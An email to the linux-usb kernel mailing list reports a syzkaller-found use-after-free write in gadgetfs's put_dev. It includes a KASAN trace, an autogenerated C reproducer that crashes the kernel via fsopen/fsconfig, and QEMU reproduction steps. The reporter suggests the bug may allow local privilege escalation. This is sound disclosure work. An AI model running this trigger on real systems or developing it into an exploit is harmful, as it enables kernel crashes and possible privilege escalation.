Return-Path: <linux-usb-owner@vger.kernel.org>
X-Original-To: lists+linux-usb@lfdr.de
Delivered-To: lists+linux-usb@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 2A7F66499E0
	for <lists+linux-usb@lfdr.de>; Mon, 12 Dec 2022 09:08:00 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S231328AbiLLIH6 (ORCPT <rfc822;lists+linux-usb@lfdr.de>);
        Mon, 12 Dec 2022 03:07:58 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:42432 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S230079AbiLLIH5 (ORCPT
        <rfc822;linux-usb@vger.kernel.org>); Mon, 12 Dec 2022 03:07:57 -0500
Received: from mail-pj1-x102a.google.com (mail-pj1-x102a.google.com [IPv6:2607:f8b0:4864:20::102a])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id AB980617D
        for <linux-usb@vger.kernel.org>; Mon, 12 Dec 2022 00:07:55 -0800 (PST)
Received: by mail-pj1-x102a.google.com with SMTP id 3-20020a17090a098300b00219041dcbe9so11333015pjo.3
        for <linux-usb@vger.kernel.org>; Mon, 12 Dec 2022 00:07:55 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=nf9ayQtLEfleJnUHuiiptUAQglaL8ZyhrXYCYKuEI1A=;
        b=EQ5TEiYs1AIPKkSuPJ/6Qle9IB8r5HySrAAlsrscsuD8zzeMsBDqdITCjcheObvm5H
         wHNz1k4oTlFJdsVGhfvFoSgvWrpOKHddTsLypLXDMcZqP3uwjNssJ1mqPByyp27nuWFw
         J+MvTJWGIEEWWaqbIGV70ZLKMahpqWTpxd/wds6J3ZA7khy4Tl3FsGicOLe6ninBPIgO
         kFpd23eR1eymHPJYSWZz9pS62chphvMDOTxdBkUK9v/yFz/eT4DqdjXoIP1xjxu+5ewz
         pynbMLMNP/a23kJgjDK58CTrawG+e4r2ow4483rMnI81CT2uf+vIUOPOuozCcPObhpqV
         h7mQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=nf9ayQtLEfleJnUHuiiptUAQglaL8ZyhrXYCYKuEI1A=;
        b=ggessZn8XAQNtD6hEqQC9wcfiLNT3QiHRzi+OFJWxsTNrUF1uv7xIefFNVcfFBgMRr
         VeECvely8HiYshRnx77fVueo7t4zQOYe7O0FU6wKv4vqE9+dQpwrOvH+RsX/nrE8gg5R
         d8rIC+OFK0DqsuEVNzGJ7Vc+PNcdPPG1bfKFr3m75S1O2LBIzxIO66DlUW8Rwq4dTZxN
         wd9ptUAfw2ePQtuTvOmpN7EEskfuiLJhdVo137yX0089qvihG2ru6a/GBgv6FFIOs3i1
         9NH4eDaqg45apmLn9/qOfKmjR4XwYrESoHTmT7Q0kBE12r2VAgSCAq/+c83JwjVggrjr
         vWQA==
X-Gm-Message-State: ANoB5pl271jOLd04YyxzWPFhNKwvWraJdjkHQ4xUYzo3j1dv2aPxETeU
        20JSx82sG+cTo9mqwNbjmogFvJb5nB5mOWYKWzH2wmEg+yjzDg==
X-Google-Smtp-Source: AA0mqf4D9ss+qx7BHZrkFUmhbD3dyaOA+Plu+j3obRZ75qr7XgRp6MrWC2Xx+kMAmEdvzlSmw6HawZnhnj6+rtiJXag=
X-Received: by 2002:a17:90a:70cb:b0:219:bef2:8fb3 with SMTP id
 a11-20020a17090a70cb00b00219bef28fb3mr24856465pjm.66.1670832474589; Mon, 12
 Dec 2022 00:07:54 -0800 (PST)
MIME-Version: 1.0
From:   Gerald Lee <sundaywind2004@gmail.com>
Date:   Mon, 12 Dec 2022 16:07:43 +0800
Message-ID: <CAO3qeMVzXDP-JU6v1u5Ags6Q-bb35kg3=C6d04DjzA9ffa5x1g@mail.gmail.com>
Subject: usb: A use-after-free Write in put_dev
To:     linux-usb@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
X-Spam-Status: No, score=-1.8 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_ENVFROM_END_DIGIT,
        FREEMAIL_FROM,RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS autolearn=ham
        autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-usb.vger.kernel.org>
X-Mailing-List: linux-usb@vger.kernel.org

Hi, all

I found a vulnerability when fuzzing linux kernel by syzkaller. The
KASAN reports that use-after-free Write in put_dev. Then I tried to
reproduce and got the C source file. I compiled it and executed the
binary program, but the kernel crashed as expected. This vulnerability
could be used to LPE as UAF, I thought.

## Linux version:

6.1.0 (master commit a4412fdd49dc011bcc2c0d81ac4cab7457092650)

## KASAN report
==================================================================
BUG: KASAN: use-after-free in instrument_atomic_read_write
include/linux/instrumented.h:102 [inline]
BUG: KASAN: use-after-free in atomic_fetch_sub_release
include/linux/atomic/atomic-instrumented.h:176 [inline]
BUG: KASAN: use-after-free in __refcount_sub_and_test
include/linux/refcount.h:272 [inline]
BUG: KASAN: use-after-free in __refcount_dec_and_test
include/linux/refcount.h:315 [inline]
BUG: KASAN: use-after-free in refcount_dec_and_test
include/linux/refcount.h:333 [inline]
BUG: KASAN: use-after-free in put_dev+0x22/0xd0
drivers/usb/gadget/legacy/inode.c:159
Write of size 4 at addr ffff8880436d2040 by task syz-executor.5/7587

CPU: 1 PID: 7587 Comm: syz-executor.5 Not tainted 6.1.0-rc7 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
1.13.0-1ubuntu1.1 04/01/2014
Call Trace:
 <TASK>
 __dump_stack lib/dump_stack.c:88 [inline]
 dump_stack_lvl+0xd1/0x138 lib/dump_stack.c:106
 print_address_description mm/kasan/report.c:284 [inline]
 print_report+0x15e/0x45d mm/kasan/report.c:395
 kasan_report+0xbf/0x1f0 mm/kasan/report.c:495
 check_region_inline mm/kasan/generic.c:183 [inline]
 kasan_check_range+0x141/0x190 mm/kasan/generic.c:189
 instrument_atomic_read_write include/linux/instrumented.h:102 [inline]
 atomic_fetch_sub_release
include/linux/atomic/atomic-instrumented.h:176 [inline]
 __refcount_sub_and_test include/linux/refcount.h:272 [inline]
 __refcount_dec_and_test include/linux/refcount.h:315 [inline]
 refcount_dec_and_test include/linux/refcount.h:333 [inline]
 put_dev+0x22/0xd0 drivers/usb/gadget/legacy/inode.c:159
 gadgetfs_kill_sb+0x2e/0x60 drivers/usb/gadget/legacy/inode.c:2086
 deactivate_locked_super+0x98/0x160 fs/super.c:332
 vfs_get_super fs/super.c:1190 [inline]
 get_tree_single+0x188/0x1d0 fs/super.c:1207
 vfs_get_tree+0x8d/0x2f0 fs/super.c:1531
 vfs_fsconfig_locked fs/fsopen.c:232 [inline]
 __do_sys_fsconfig+0x8d6/0xc20 fs/fsopen.c:439
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x39/0xb0 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x63/0xcd
RIP: 0033:0x7f8d5129078d
Code: c3 e8 17 32 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48
89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d
01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007f8d52024bd8 EFLAGS: 00000246 ORIG_RAX: 00000000000001af
RAX: ffffffffffffffda RBX: 00007f8d513cbf80 RCX: 00007f8d5129078d
RDX: 0000000000000000 RSI: 0000000000000006 RDI: 0000000000000003
RBP: 00007f8d512feb02 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 00007ffd48293eff R14: 00007ffd48294090 R15: 00007f8d52024d80
 </TASK>

Allocated by task 7561:
 kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
 kasan_set_track+0x25/0x30 mm/kasan/common.c:52
 ____kasan_kmalloc mm/kasan/common.c:371 [inline]
 ____kasan_kmalloc mm/kasan/common.c:330 [inline]
 __kasan_kmalloc+0xa5/0xb0 mm/kasan/common.c:380
 kmalloc include/linux/slab.h:553 [inline]
 kzalloc include/linux/slab.h:689 [inline]
 dev_new drivers/usb/gadget/legacy/inode.c:170 [inline]
 gadgetfs_fill_super+0x1e4/0x460 drivers/usb/gadget/legacy/inode.c:2041
 vfs_get_super fs/super.c:1169 [inline]
 get_tree_single+0xd6/0x1d0 fs/super.c:1207
 vfs_get_tree+0x8d/0x2f0 fs/super.c:1531
 vfs_fsconfig_locked fs/fsopen.c:232 [inline]
 __do_sys_fsconfig+0x8d6/0xc20 fs/fsopen.c:439
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x39/0xb0 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x63/0xcd

Last potentially related work creation:
 kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
 __kasan_record_aux_stack+0xbc/0xd0 mm/kasan/generic.c:481
 call_rcu+0x9d/0x820 kernel/rcu/tree.c:2798
 pwq_unbound_release_workfn+0x26b/0x340 kernel/workqueue.c:3736
 process_one_work+0x9bf/0x1710 kernel/workqueue.c:2289
 worker_thread+0x669/0x1090 kernel/workqueue.c:2436
 kthread+0x2e8/0x3a0 kernel/kthread.c:376
 ret_from_fork+0x1f/0x30 arch/x86/entry/entry_64.S:306

Second to last potentially related work creation:
 kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
 __kasan_record_aux_stack+0xbc/0xd0 mm/kasan/generic.c:481
 call_rcu+0x9d/0x820 kernel/rcu/tree.c:2798
 pwq_unbound_release_workfn+0x26b/0x340 kernel/workqueue.c:3736
 process_one_work+0x9bf/0x1710 kernel/workqueue.c:2289
 worker_thread+0x669/0x1090 kernel/workqueue.c:2436
 kthread+0x2e8/0x3a0 kernel/kthread.c:376
 ret_from_fork+0x1f/0x30 arch/x86/entry/entry_64.S:306

The buggy address belongs to the object at ffff8880436d2000
 which belongs to the cache kmalloc-1k of size 1024
The buggy address is located 64 bytes inside of
 1024-byte region [ffff8880436d2000, ffff8880436d2400)

The buggy address belongs to the physical page:
page:ffffea00010db400 refcount:1 mapcount:0 mapping:0000000000000000
index:0x0 pfn:0x436d0
head:ffffea00010db400 order:3 compound_mapcount:0 compound_pincount:0
flags: 0x4fff00000010200(slab|head|node=1|zone=1|lastcpupid=0x7ff)
raw: 04fff00000010200 dead000000000100 dead000000000122 ffff888012041dc0
raw: 0000000000000000 0000000000100010 00000001ffffffff 0000000000000000
page dumped because: kasan: bad access detected
page_owner tracks the page as allocated
page last allocated via order 3, migratetype Unmovable, gfp_mask
0x52a20(GFP_ATOMIC|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP), pid 6599,
tgid 6599 (syz-executor.0), ts 29294571719, free_ts 29285126043
 prep_new_page mm/page_alloc.c:2539 [inline]
 get_page_from_freelist+0x10b5/0x2d50 mm/page_alloc.c:4291
 __alloc_pages+0x1cb/0x5b0 mm/page_alloc.c:5558
 alloc_pages+0x1aa/0x270 mm/mempolicy.c:2285
 alloc_slab_page mm/slub.c:1794 [inline]
 allocate_slab+0x213/0x300 mm/slub.c:1939
 new_slab mm/slub.c:1992 [inline]
 ___slab_alloc+0xa9b/0x13e0 mm/slub.c:3180
 __slab_alloc.constprop.0+0x56/0xa0 mm/slub.c:3279
 slab_alloc_node mm/slub.c:3364 [inline]
 __kmem_cache_alloc_node+0x199/0x3e0 mm/slub.c:3437
 kmalloc_trace+0x26/0x60 mm/slab_common.c:1045
 kmalloc include/linux/slab.h:553 [inline]
 kzalloc include/linux/slab.h:689 [inline]
 batadv_hardif_add_interface net/batman-adv/hard-interface.c:864 [inline]
 batadv_hard_if_event+0x8a1/0x1450 net/batman-adv/hard-interface.c:952
 notifier_call_chain+0xb5/0x200 kernel/notifier.c:87
 call_netdevice_notifiers_info+0xb5/0x130 net/core/dev.c:1945
 call_netdevice_notifiers_extack net/core/dev.c:1983 [inline]
 call_netdevice_notifiers net/core/dev.c:1997 [inline]
 register_netdevice+0x10bf/0x1670 net/core/dev.c:10090
 veth_newlink+0x4d1/0x990 drivers/net/veth.c:1795
 rtnl_newlink_create net/core/rtnetlink.c:3364 [inline]
 __rtnl_newlink+0x1084/0x17e0 net/core/rtnetlink.c:3581
 rtnl_newlink+0x68/0xa0 net/core/rtnetlink.c:3594
 rtnetlink_rcv_msg+0x43e/0xca0 net/core/rtnetlink.c:6091
page last free stack trace:
 reset_page_owner include/linux/page_owner.h:24 [inline]
 free_pages_prepare mm/page_alloc.c:1459 [inline]
 free_pcp_prepare+0x65c/0xd90 mm/page_alloc.c:1509
 free_unref_page_prepare mm/page_alloc.c:3387 [inline]
 free_unref_page+0x1d/0x4d0 mm/page_alloc.c:3483
 qlink_free mm/kasan/quarantine.c:168 [inline]
 qlist_free_all+0x6a/0x170 mm/kasan/quarantine.c:187
 kasan_quarantine_reduce+0x184/0x210 mm/kasan/quarantine.c:294
 __kasan_slab_alloc+0x66/0x90 mm/kasan/common.c:302
 kasan_slab_alloc include/linux/kasan.h:201 [inline]
 slab_post_alloc_hook mm/slab.h:737 [inline]
 slab_alloc_node mm/slub.c:3398 [inline]
 __kmem_cache_alloc_node+0x2e2/0x3e0 mm/slub.c:3437
 kmalloc_trace+0x26/0x60 mm/slab_common.c:1045
 kmalloc include/linux/slab.h:553 [inline]
 kzalloc include/linux/slab.h:689 [inline]
 kset_create lib/kobject.c:937 [inline]
 kset_create_and_add+0x4f/0x1a0 lib/kobject.c:980
 register_queue_kobjects net/core/net-sysfs.c:1766 [inline]
 netdev_register_kobject+0x1ca/0x400 net/core/net-sysfs.c:2019
 register_netdevice+0xd99/0x1670 net/core/dev.c:10057
 __ip_tunnel_create+0x398/0x570 net/ipv4/ip_tunnel.c:267
 ip_tunnel_init_net+0x2ec/0x9f0 net/ipv4/ip_tunnel.c:1073
 ops_init+0xb9/0x680 net/core/net_namespace.c:135
 setup_net+0x5d1/0xc50 net/core/net_namespace.c:332
 copy_net_ns+0x31c/0x760 net/core/net_namespace.c:478
 create_new_namespaces+0x3f6/0xb20 kernel/nsproxy.c:110

Memory state around the buggy address:
 ffff8880436d1f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff8880436d1f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>ffff8880436d2000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
                                           ^
 ffff8880436d2080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
 ffff8880436d2100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
==================================================================

## repro.c

// autogenerated by syzkaller (https://github.com/google/syzkaller)

#define _GNU_SOURCE

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

static unsigned long long procid;

static void sleep_ms(uint64_t ms)
{
usleep(ms * 1000);
}

static uint64_t current_time_ms(void)
{
struct timespec ts;
if (clock_gettime(CLOCK_MONOTONIC, &ts))
exit(1);
return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static bool write_file(const char* file, const char* what, ...)
{
char buf[1024];
va_list args;
va_start(args, what);
vsnprintf(buf, sizeof(buf), what, args);
va_end(args);
buf[sizeof(buf) - 1] = 0;
int len = strlen(buf);
int fd = open(file, O_WRONLY | O_CLOEXEC);
if (fd == -1)
return false;
if (write(fd, buf, len) != len) {
int err = errno;
close(fd);
errno = err;
return false;
}
close(fd);
return true;
}

static void kill_and_wait(int pid, int* status)
{
kill(-pid, SIGKILL);
kill(pid, SIGKILL);
for (int i = 0; i < 100; i++) {
if (waitpid(-1, status, WNOHANG | __WALL) == pid)
return;
usleep(1000);
}
DIR* dir = opendir("/sys/fs/fuse/connections");
if (dir) {
for (;;) {
struct dirent* ent = readdir(dir);
if (!ent)
break;
if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
continue;
char abort[300];
snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort",
ent->d_name);
int fd = open(abort, O_WRONLY);
if (fd == -1) {
continue;
}
if (write(fd, abort, 1) < 0) {
}
close(fd);
}
closedir(dir);
} else {
}
while (waitpid(-1, status, __WALL) != pid) {
}
}

static void setup_test()
{
prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
setpgrp();
write_file("/proc/self/oom_score_adj", "1000");
}

static void execute_one(void);

#define WAIT_FLAGS __WALL

static void loop(void)
{
int iter = 0;
for (;; iter++) {
int pid = fork();
if (pid < 0)
exit(1);
if (pid == 0) {
setup_test();
execute_one();
exit(0);
}
int status = 0;
uint64_t start = current_time_ms();
for (;;) {
if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) == pid)
break;
sleep_ms(1);
if (current_time_ms() - start < 5000)
continue;
kill_and_wait(pid, &status);
break;
}
}
}

uint64_t r[1] = {0xffffffffffffffff};

void execute_one(void)
{
intptr_t res = 0;
memcpy((void*)0x20000040, "gadgetfs\000", 9);
res = syscall(__NR_fsopen, 0x20000040ul, 0ul);
if (res != -1)
r[0] = res;
syscall(__NR_fsconfig, r[0], 6ul, 0ul, 0ul, 0ul);

}
int main(void)
{
syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
for (procid = 0; procid < 2; procid++) {
if (fork() == 0) {
loop();
}
}
sleep(1000000);
return 0;
}


## Some repro steps

1. create qemu image

$ wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh
-O create-image.sh
$ chmod +x create-image.sh
$ ./create-image.sh --feature full    # generate stretch.img

2. run VM

$ /usr/bin/qemu-system-x86_64 \
    -m 2048 -smp 2 \
    -chardev socket,id=SOCKSYZ,server=on,wait=off,host=localhost,port=31337 \
    -mon chardev=SOCKSYZ,mode=control \
    -display none \
    -serial stdio \
    -no-reboot -no-hpet -name VM-RP \
    -device virtio-rng-pci \
    -enable-kvm \
    -cpu host,migratable=off \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,restrict=on,hostfwd=tcp:127.0.0.1:22422-:22 \
    -hda stretch.img \
    -snapshot \
    -kernel /opt/kernel/arch/x86/boot/bzImage \
    -append "root=/dev/sda console=ttyS0 earlyprintk=serial hpet=disable"

3. compile repro.c and execute repro

$ scp -i stretch.id_rsa -P 22422 -o "StrictHostKeyChecking no" repro.c
root@localhost:/root
$ ssh -i stretch.id_rsa -p 22422 -o "StrictHostKeyChecking no" root@localhost

In guestOS
# gcc -o repro repro.c -lpthread
# ./repro


Thanks.
